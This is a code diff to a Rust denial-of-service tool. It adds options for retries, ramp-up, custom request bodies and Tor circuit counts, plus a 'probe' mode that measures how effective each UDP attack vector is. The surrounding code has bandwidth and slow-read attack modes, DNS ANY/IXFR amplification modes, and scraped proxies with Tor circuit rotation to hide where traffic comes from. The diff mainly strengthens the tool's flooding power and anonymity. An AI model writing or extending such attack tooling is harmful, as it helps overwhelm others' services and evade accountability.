@@ -211,6 +211,7 @@ async fn main() {
     let mut verbose = false;
     let mut rate_limit: Option<u64> = None;
     let mut max_redirects: usize = 10;
+    let mut max_retries: usize = 3;
     let mut rotation_strategy = String::from("weighted");  // weighted, round-robin, random
     let mut log_file: Option<String> = None;
     let mut canary = false;
@@ -330,6 +331,11 @@ async fn main() {
                     tor_bridges = Some(val);
                 }
             }
+            "--tor-circuits" => {
+                if let Some(val) = args_iter.next() {
+                    tor_circuits = val.parse().unwrap_or(3);
+                }
+            }
             "--tor-circuit-timeout" => {
                 if let Some(val) = args_iter.next() {
                     tor_circuit_timeout = val.parse().ok();
@@ -410,6 +416,59 @@ async fn main() {
                     rate_limit = val.parse().ok();
                 }
             }
+            "--rotation-strategy" => {
+                if let Some(val) = args_iter.next() {
+                    rotation_strategy = val;
+                }
+            }
+            "--ramp-up" => {
+                if let Some(val) = args_iter.next() {
+                    ramp_up_secs = val.parse().unwrap_or(0);
+                }
+            }
+            "--stats-interval" => {
+                if let Some(val) = args_iter.next() {
+                    stats_interval_secs = val.parse().unwrap_or(5);
+                }
+            }
+            "--request-timeout" => {
+                if let Some(val) = args_iter.next() {
+                    if let Ok(parsed) = val.parse::<u64>() {
+                        request_timeout = parsed.clamp(1, 300);
+                    }
+                }
+            }
+            "--body" => {
+                if let Some(val) = args_iter.next() {
+                    let _ = CUSTOM_POST_BODY.set(val);
+                }
+            }
+            "--content-type" => {
+                if let Some(val) = args_iter.next() {
+                    let _ = CUSTOM_CONTENT_TYPE.set(val);
+                }
+            }
+            "--max-redirects" => {
+                if let Some(val) = args_iter.next() {
+                    max_redirects = val.parse().unwrap_or(10);
+                }
+            }
+            "--max-retries" => {
+                if let Some(val) = args_iter.next() {
+                    max_retries = val.parse().unwrap_or(3);
+                }
+            }
+            "--log-file" => {
+                if let Some(val) = args_iter.next() {
+                    log_file = Some(val);
+                }
+            }
+            "--report" => {
+                if let Some(val) = args_iter.next() {
+                    report_file = Some(val);
+                }
+            }
+            "--canary" => canary = true,
             _ => {
                 let other = arg;
                 // Keep the old format as fallback with '=value' style flags
@@ -594,6 +653,14 @@ async fn main() {
         let udp_mode_str = positional.get(1).cloned().unwrap_or_else(|| "dns-any".to_string());
         let udp_concurrency: usize = positional.get(2).and_then(|s| s.parse().ok()).unwrap_or(5);
         let udp_duration: u64 = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(30);
+
+        // Probe mode: single-shot effectiveness test across all UDP vectors
+        if udp_mode_str == "probe" {
+            let timeout_ms: u64 = positional.get(2).and_then(|s| s.parse().ok()).unwrap_or(2000);
+            udp::run_udp_probe(&udp_host, timeout_ms).await;
+            return;
+        }
+
         let udp_mode = match udp_mode_str.as_str() {
             "dns-any" | "dnsany" => udp::UdpMode::DnsAny,
             "dns-ixfr" | "dnsixfr" => udp::UdpMode::DnsIxfr,
@@ -698,6 +765,7 @@ async fn main() {
             st.mode = ProxyMode::Tor;
             st.client_config = config.clone();
             st.verbose = verbose;
+            st.max_retries = max_retries;
         }
         println!("[tor-only] Checking Tor...");
         let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
@@ -738,6 +806,7 @@ async fn main() {
             st.custom_selector = custom_selector.clone();
             st.client_config = config.clone();
             st.verbose = verbose;
+            st.max_retries = max_retries;
             st.tor_proxy = tor_proxy.clone();
             st.attack_mode = AttackMode::from_str(&attack_str);
             st.mode = ProxyMode::from_str(&mode_str);
@@ -818,6 +887,7 @@ async fn main() {
         st.client_config = config.clone();
         st.tor_proxy = tor_proxy.clone();
         st.verbose = verbose;
+        st.max_retries = max_retries;
         st.attack_mode = match attack_str.as_str() {
             "bandwidth" => AttackMode::Bandwidth,
             "slowread" => AttackMode::SlowRead,
@@ -913,10 +983,13 @@ async fn main() {
         }
         Some(prox_list) => {
             println!("  Got {} proxies", prox_list.len());
-            // Warm up Tor circuits when --tor-proxy is used with Tor mode
-            if matches!(mode_str.as_str(), "tor" | "scrape-tor") && tor_proxy.is_some() {
+            // Warm up Tor circuits whenever a Tor proxy is supplied (any mode)
+            if tor_proxy.is_some() {
                 println!("  Warming {} Tor circuits...", tor_circuits);
-                warm_tor_circuits(&prox_list, &target_url, timeout_secs, 1).await;
+                // Cold Tor circuits can exceed the per-request timeout on first connect,
+                // so warm up with a dedicated generous budget (circuit timeout or 30s).
+                let warmup_timeout = tor_circuit_timeout.unwrap_or(30).max(30);
+                warm_tor_circuits(&prox_list, &target_url, warmup_timeout, 1, tor_circuits).await;
                 println!("  Tor circuits ready.");
             }
             if let Some(ref path) = save_proxies {
@@ -1201,7 +1274,9 @@ async fn main() {
                             }
                         }
                     } else {
-                        println!("  [System] Tor Control Port {} unreachable; skipping dynamic circuit cycling.", tor_ctrl);
+                        // Control port is optional. Without it, dynamic circuit cycling is
+                        // skipped but static per-credential circuit isolation still works.
+                        println!("  [System] No Tor control port at {}; dynamic circuit cycling off (static circuits still isolated).", tor_ctrl);
                     }
                 });
             }
@@ -1390,6 +1465,23 @@ async fn main() {
                         stats.status_3xx.load(Ordering::Relaxed),
                         stats.status_4xx.load(Ordering::Relaxed),
                         stats.status_5xx.load(Ordering::Relaxed),
+                        cur_errors,
+                        stats.error_timeout.load(Ordering::Relaxed),
+                        stats.error_connect.load(Ordering::Relaxed),
+                        stats.error_other.load(Ordering::Relaxed)
+                    );
+                } else if !quiet {
+                    // Machine-parseable stats tick for the GUI dashboard.
+                    // Must satisfy renderer.js: elapsedRegex + statsRegex + codesRegex
+                    // (codesRegex requires the "Other:" field between 5xx and Errors).
+                    println!(
+                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Latency: {:.1}ms (p50: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Other: {} | Errors: {} (Timeout: {}, Connect: {}, Other: {})",
+                        elapsed, req_rate, byte_rate, avg_latency, p50, p99,
+                        stats.status_2xx.load(Ordering::Relaxed),
+                        stats.status_3xx.load(Ordering::Relaxed),
+                        stats.status_4xx.load(Ordering::Relaxed),
+                        stats.status_5xx.load(Ordering::Relaxed),
+                        stats.status_other.load(Ordering::Relaxed),
                         cur_errors,
                         stats.error_timeout.load(Ordering::Relaxed),
                         stats.error_connect.load(Ordering::Relaxed),
